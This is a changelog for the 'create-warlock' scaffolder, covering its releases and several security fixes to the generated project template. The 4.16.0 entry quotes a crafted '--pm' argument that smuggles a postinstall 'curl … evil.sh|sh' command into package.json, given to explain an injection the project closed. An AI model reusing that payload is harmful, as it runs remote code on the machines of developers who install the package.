# Changelog — create-warlock

All notable changes to `create-warlock` are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/). `@warlock.js/*` packages are released in lockstep — every package shares the same version number, so a version below may list only the changes that affected this package.

## 5.17.0 - 2026-09-21

### Changed

- Web scaffold pages use the 5.17 `config` export with `PageConfig`, keeping loaders and components as separate exports. New apps depend on `@mongez/localization:^3.5.0` for scoped route translations.
- The CLI's source formatting check is part of `test`. Interactive project naming and preset selection preserve the entered name when Customize advances to package-manager selection.

### Security

- **BREAKING:** the scaffolded `GET /uploads/*` route resized images to any `?w=&h=` a client sent. This was a denial-of-service vector, because every new size forced a full decode and resize and nothing was cached. The route also resolved the path without a containment check. The generated `src/app/uploads/controllers/fetch-uploaded-file.controller.ts` is gone. `src/app/uploads/routes.ts` now mounts core's `uploadedFileController`, which keeps the request inside the storage root and only renders the named variants the app declares. `?w=` and `?h=` now return 400. **Existing projects should apply the same change:**

  ```diff
  // src/app/uploads/routes.ts
  - import { router } from "@warlock.js/core";
  - import { fetchUploadedFileController } from "./controllers/fetch-uploaded-file.controller";
  -
  - router.get("/uploads/*", fetchUploadedFileController);
  + import { router, uploadedFileController } from "@warlock.js/core";
  +
  + router.get("/uploads/*", uploadedFileController);
  ```

  Then delete `src/app/uploads/controllers/fetch-uploaded-file.controller.ts`. To keep resized images, declare named variants in `src/config/uploads.ts` (the template has no such file, so create one) and replace `?w=320` in your URLs with `?variant=thumb`:

  ```ts
  // src/config/uploads.ts
  import type { UploadsConfigurations } from "@warlock.js/core";

  const uploadsConfigurations: UploadsConfigurations = {
    images: {
      variants: {
        thumb: { width: 320 },
        card: { width: 640 },
        hero: { width: 1280 },
      },
      formats: ["webp"], // allows &format=webp
    },
  };

  export default uploadsConfigurations;
  ```

### Fixed

- The scaffolded `src/config/cache.ts` namespaced every cache key by `request.originDomain || request.header("domain") || request.input("domain")`. A browser GET carries no `Origin` while a CSRF-protected POST does, so the same visitor resolved two different prefixes and a write could never invalidate what a read had cached — repository caches and page-cache tags went silently stale (verified live on a real app). None of those three inputs are server-validated either, so any visitor could pick `?domain=anything` or a `domain` header to land in an arbitrary namespace and grow the in-memory store without bound. `globalPrefix` is now a fixed, app-owned string derived from `APP_NAME`, with no request data read at all. **Existing projects should apply the same change** to `src/config/cache.ts`:

  ```diff
  - const globalPrefix = () => {
  -   const { request } = useRequestStore();
  -   let cachePrefix = "store";
  -   if (!request) return cachePrefix;
  -   const domain = request.originDomain || request.header("domain") || request.input("domain");
  -   if (!domain) return cachePrefix;
  -   return `${cachePrefix}.${domain}`;
  - };
  + const globalPrefix = () => env("APP_NAME", "store");
  ```

  Genuine multi-tenancy still needs per-tenant isolation — do that with a tenant id your own middleware has already validated against your tenants table (e.g. `request.locals.tenant`), never the raw `Origin`, `Host`, a header, or query input. See the updated template's `src/config/cache.ts` for a commented example. Guarded by a new check in `specs/template-integrity.spec.ts`.

### Added

- `pnpm typecheck:template` runs `tsc --noEmit` on `templates/warlock/src/` against this checkout's own `@warlock.js/*` source (via `tsconfig.template-check.json`), catching a template import that no longer exists in the framework — the class of bug that let a removed-but-still-used import pass all 291 tests. Enforced on every run by `specs/template-typecheck.spec.ts`, complementing the slower registry-install `typecheck:scaffold` gate.
- The scaffolded `src/config/http.ts` now sets `trustProxy: false` explicitly, with a comment on when/how to enable it behind a proxy or load balancer, and ships a commented-out, nonce-based `csp` starter block so both are discoverable instead of silently absent.

## 5.15.0 - 2026-09-18

### Added

- The feature picker offers **Sitemap** — runtime `sitemap.xml` generation from the page registry.
- The feature picker offers **Bull Board**, the queue dashboard. `warlock add bull-board` shipped in 5.14 but the scaffolder never offered it, so a new app could not select it at creation time.

## 5.14.0 - 2026-09-17

### Changed

- **BREAKING:** the web starter's `src/web/root.tsx` renders the hydration mount as `<div id="vessel">` (was `#root`).

## 5.13.0 - 2026-09-17

### Added

- The optional-feature selector now offers Google sign-in, passkey sign-in, and durable Redis-backed BullMQ queues.

### Fixed

- A `--db=postgres` scaffold shipped `src/config/database.ts` with an empty `clientOptions: {}`. Cascade's `PostgresPoolConfig` extends `PostgresConnectionConfig`, whose `database` field is required (not optional, unlike Mongo's `MongoClientOptions`), so `{}` failed `tsc --noEmit` on that exact line before a single line of app code ran. `templates/warlock/src/config/database.postgres.ts` now sets `database` inside `clientOptions` too. Verified against a real `npm create warlock@5.12.0 --stack=web --db=postgres --jwt` scaffold installed from the registry: this was the only `tsc` error once devDependencies installed correctly (see below), and it is gone after the fix. Guarded by a new static check in `specs/template-integrity.spec.ts`.
- Investigated a separate report that a `--stack=web --db=postgres --jwt` scaffold lacked `@warlock.js/web` and `@types/react`/`@types/react-dom`. **Not reproducible** against the published 5.12.0 template: `package.json` lists all three correctly, and a clean install (`npm ci` with `NODE_ENV` unset) installs them. The only way to reproduce the missing `@types/*` packages was installing with `NODE_ENV=production` set, which makes npm skip `devDependencies` entirely — an environment condition on the installing machine, not a scaffold defect. No template change made for this report.
- The scaffolded `User` model's `verified` scope queried a boolean `emailVerified` column that has never existed in the template's schema or migration. `@warlock.js/auth`'s email verification (added in 5.13.0) stamps `emailVerifiedAt` (a nullable `Date`) instead, treating "verified" as the field holding a value. `templates/warlock/src/app/users/models/user/user.model.ts` now declares `emailVerifiedAt: v.date().optional()` on the schema and scopes `verified` via `query.whereNotNull("emailVerifiedAt")`; the user migration adds the matching nullable `timestamp()` column. Guarded by new checks in `specs/template-integrity.spec.ts`.

## 5.12.0 - 2026-09-16

### Changed

- `create-warlock` asks at most one question (API-only or full-stack web); every other choice is a flag with a default, printed after scaffolding. Fully non-interactive with `--yes`; `--interactive` restores the long form; `--agents` picks agent-kit targets (default `claude`).

### Fixed

- `npm run seed` failed on a fresh scaffold: the generated `userSchema` required `image` and `lastLogin`, but neither the seed data nor a password login ever supplies them. Both are now `.optional()` on the model — `image` is still required at registration by the controller's own `create-user.schema.ts`, and `lastLogin` is only ever written by the social-login handler, so a user who has never logged in correctly has neither.

## 5.11.0 - 2026-09-14

### Removed

- The generated `guardedAdmin()` router helper. It only checked that the user was signed in — any user type — while its name and `/admin` prefix implied an admin-only area. New projects get `guarded()` (any authenticated user) and a documented example for restricting a group to a user type. Existing projects keep their own copy of the file; review it if you used `guardedAdmin`.

## 5.10.0 - 2026-09-14

### Fixed

- A postgres scaffold shipped `src/config/database.postgres.ts` unformatted, so a new project's first dev run flagged it. The template is formatted, and the template-format check now runs as part of `create-warlock`'s own test suite.

## 5.9.0 - 2026-09-13

_Released in lockstep with the `@warlock.js/*` family; no package-specific changes in 5.9.0._

## 5.7.0 - 2026-09-11

### Fixed

- A freshly scaffolded project could fail `npm install` outright on Node 22, crashing inside npm 10.9.x's Arborist peer resolver with `Cannot read properties of null (reading 'edgesOut')` while resolving the template's vitest dependency. The template now pins vitest to 4.0.5.
- When the generated project's install failed, the scaffolder told the user to "fix the error above, then run the install again" — advice that could not be followed for an npm-internal crash. It now recognizes the npm 10.9.x Arborist crash and points to concrete next steps (npm 11, pnpm, or yarn) instead.

## 5.5.0 - 2026-09-07

### Fixed

- Documentation shipped in this package's `skills/` told users to run `pnpm`-specific commands. `pnpm <binary>` has no npm equivalent, so those instructions failed outright for anyone not using pnpm. Commands are now package-manager neutral.

## 5.3.2 - 2026-09-05

### Fixed

- `npm create warlock` could not complete on a clean machine. The starter's `prepare` script ran husky, which needs a git repository, and the scaffolder installs before it runs `git init` — so the install failed and the scaffolder aborted with an empty `node_modules`, with and without `--no-git`.
- The first `pnpm install` in a fresh project failed with `ERR_PNPM_IGNORED_BUILDS`. pnpm writes `pnpm-workspace.yaml` with a literal `esbuild: set this to true or false` placeholder when it meets an ignored build script non-interactively, and then rejects that value on the next install. The template now ships a decided value, so pnpm never writes the placeholder.
- A scaffolded app failed its own ESLint check on the first `warlock dev`. The `web` feature injected its connector import at the TOP of `warlock.config.ts`, ahead of the imports the template already had, and the generated app formats with `prettier-plugin-organize-imports` — so the injected line was out of order the moment it was written. It is now inserted in sorted position.
- Running the scaffolder without a terminal — from CI, a script, or any non-interactive shell — died with `TTY initialization failed: uv_tty_init returned EBADF`, a libuv internal shown to a developer whose only mistake was not being at a keyboard. A missing terminal is no longer an error when the flags already answer every prompt; only a genuinely unanswerable question stops the run, and it names `--yes` and the flags that supply it.

### Removed

- husky and its `prepare` script from the starter. Note what goes with it: the generated project ships no CI, so the format, lint, typecheck and test that ran on commit are gone with nothing yet replacing them. That gap is tracked separately.

## 5.3.1 - 2026-09-04

### Fixed

- `npm create warlock@5.3.1` resolves and runs. The 5.3.0 scaffolder could not install, because the family's reciprocal exact peer requirements were unsatisfiable from a fresh registry install.

## 5.3.0 - 2026-09-03

### Added

- A browser gate for the freshly scaffolded starter, so the generated project is exercised in a real browser rather than assumed to work.

### Changed

- The web starter template migrated to the current page contract, with a pinned home route identity so SSR and hydration agree on one route name.

### Fixed

- The scaffolder no longer parses CSS as TypeScript.

## 5.2.3 - 2026-09-02

### Fixed

- New projects now resolve and stamp the coherent 5.2.3 family, making the repaired Web generator the default scaffold path.

## 5.2.2

### Added

- **A resolver-boundary check (`scripts/check-resolver-boundaries.mjs`), run in CI.** Every
  `package.json` in the checkout is treated as a publish boundary; the script walks each
  package's `tsconfig.json` `paths` and any `vite.config.*` / `vitest.config.*` alias and
  fails if one resolves outside its own package. A test/build-only alias that reaches into a
  sibling checkout (e.g. `../core/src`) proves nothing about the published package — it
  resolves locally today and 404s the moment the package is installed on its own. Covered by
  `specs/resolver-boundaries.spec.ts`.
- **`--help`/`--version` are now exercised end to end** (`specs/cli-entry.spec.ts`): both exit
  0 before `createNewApp` runs — no prompt, filesystem write, or network call — and `--help`
  wins even over a positional project name and other flags. `--version` prints this package's
  own `package.json` version, pinned loosely (a bare semver-ish string) since the exact value
  drifts every release.
- **A CI workflow (`.github/workflows/ci.yml`)**, with two jobs: `specs` (resolver-boundary
  check, a `--version` smoke test asserting the built CLI's reported version matches
  `package.json`, then `vitest`) and `scaffold-typecheck` (the existing
  `typecheck:scaffold` gate, scaffolding a real project and installing it). `specs` runs on
  pushes to `main`/`master` and every pull request; both jobs also run nightly
  (`schedule: cron "0 4 * * *"`) plus
  `workflow_dispatch`, since the scaffold-typecheck gate installs the framework from the
  registry and can go red from a framework release alone, without anyone touching this repo.

## 5.1.0

> **If your scaffold includes the `web` feature, upgrade.** React did not execute at all
> in published installs of `@warlock.js/web` 5.0.0 through 5.0.2 — see that package's
> changelog for the defect and its fix.

### Added

- **The scaffold typechecks from a fresh install, and a CI gate keeps it that way.** A
  newly created project previously could fail `tsc` on its own generated source.
- **A real home page**, replacing the placeholder — it includes a counter whose working
  state is proof that hydration actually ran in the browser.

### Changed

- **`src/typings.d.ts` is now the sanctioned home for `RequestLocals` / `RequestUser`
  module augmentation.** The file is generated with both augmentation blocks stubbed and
  commented, so there is one obvious place to declare per-request typed data.
- Replaced stale scaffold values that had been carried forward: the `wow2` project name
  and the `4.15.0` dependency version no longer appear in generated projects.

## 5.0.2 - 2026-08-25

No changes to `create-warlock`. Released in lockstep with the `@warlock.js/web` SSR fix
(`ssr.noExternal`) — see that package's changelog.

## 5.0.1 - 2026-08-25

### Fixed

- **The `warlock` binary was never linked in a yarn-1 scaffold.** Installing the batched
  features under yarn 1 hit an _Invariant Violation_ in yarn's linker, which aborted the
  install before `node_modules/.bin` was written — leaving a scaffolded project whose
  own `warlock` command did not exist. `App.pinViteResolution()` now writes matching
  `resolutions` and `overrides` entries for vite into the generated `package.json`
  _before_ the batched feature install runs, so a single vite version is resolved and
  the linker completes.

## 5.0.0 - 2026-08-25

### Added

- The project creator now offers the `web` feature for Warlock SSR pages.

### Changed

- Scaffold command failures are captured and reported instead of allowing later success output to hide a failed dependency install, Git initialization, feature addition, or cache warm-up.
- Generated route handlers use the new request-context argument shape, and generated cache configuration honors `CACHE_DRIVER`.

## 4.16.0 - 2026-08-18

### Security

- **`--pm` is now validated against an allow-list (`npm`/`yarn`/`pnpm`/`bun`) before it reaches anything.** Previously an arbitrary `--pm` string flowed straight into `spawn()` as the executable to run _and_ was spliced verbatim into the generated `package.json`'s script text before that text is parsed as JSON — a crafted value (e.g. `--pm='pnpm","postinstall":"curl${IFS}evil.sh|sh#'`) could inject a `postinstall` script that the scaffolder's own automatic `install()` step would then execute, or invoke an arbitrary binary on `PATH` outright. `--yes`/non-interactive scaffolds now reject any `--pm` outside the allow-list and exit before the package manager is set, closing both sinks at the source; the interactive prompt was already safe (its options are drawn from the allow-list, never free text).

### Dependencies

- Bumped `@mongez/reinforcements` to `^4.0.1` (package dependency + project template). This is a **major** bump: `Random.string/nanoid/id/token/uuid` are now CSPRNG-backed (WebCrypto) and no longer honor `Random.seed()`, and throw without WebCrypto available. Audited `create-warlock`'s own source and the `templates/warlock` scaffold for `Random.seed`/`Random.*` usage — none found, no code changes required.
- Project template (`templates/warlock/package.json`) `@mongez/*` deps bumped: `@mongez/localization` to `^3.4.7`, `@mongez/supportive-is` to `^2.1.4`, `@mongez/agent-kit` to `^1.2.1`.
- Project template `@warlock.js/*` deps were pinned at the stale `4.0.119` — rewritten to the current lockstep version `4.15.0` to match the published `@warlock.js/*` packages.

## 4.12.0

### Changed

- Declares its own test runner and pins it to an exact version (`vitest@4.1.10`). The package is its own repository, so a runner resolved from a workspace root it may not be cloned with is a runner it cannot rely on. The pin is exact rather than a range because the version moved underneath the suite mid-development on an unrelated install — a suite whose runner can change without anyone choosing it proves less than it appears to

## 4.7.0

### Added

- Non-interactive scaffolding — `create-warlock <name> --yes` (with `--db`, `--pm`, `--features`, `--ai`, `--git`, `--jwt`) scaffolds the entire app in a single command, no prompts
- `--db=none` / `--no-db` and a **None** option in the database prompt — scaffold with no database: the driver, its package, and `src/config/database.ts` are all skipped

### Changed

- Starter models drop the baked-in `globalColumnsSchema` audit columns (`createdBy` / `updatedBy` / `deletedBy` / `isActive`) — global columns are left to the developer

## 4.2.11

### Changed

- Bumped `@mongez/reinforcements` to 3.3.0 (package dependency + project template)

## 4.2.10

### Changed

- The project template now pins the latest `@mongez/*` versions (`@mongez/reinforcements@^3.2.0`, `@mongez/agent-kit@^1.2.0`) so freshly scaffolded apps start on current dependencies. (`@warlock.js/*` versions are still rewritten to the scaffolder's own version at install time.)

## 4.2.7

### Fixed

- The published package now ships its `templates/` folder, so scaffolding a new project works from the installed package — it was missing from the build, which failed the wizard with "Something went wrong" at the template-copy step.

## 4.2.6

### Fixed

- The published package now ships its `bin` folder again, so the `create-warlock` CLI works from the installed package — it was omitted from the 4.2.5 build.

## 4.2.5

- The feature wizard now offers **Notifications** (`@warlock.js/notifications`) under "Jobs & Messaging" — opt-in; selecting it delegates to `warlock add notifications` (ejects config + scaffolds the in-app model/migration).

## 4.1.15

- Baseline — per-package changelog tracking starts at this version.
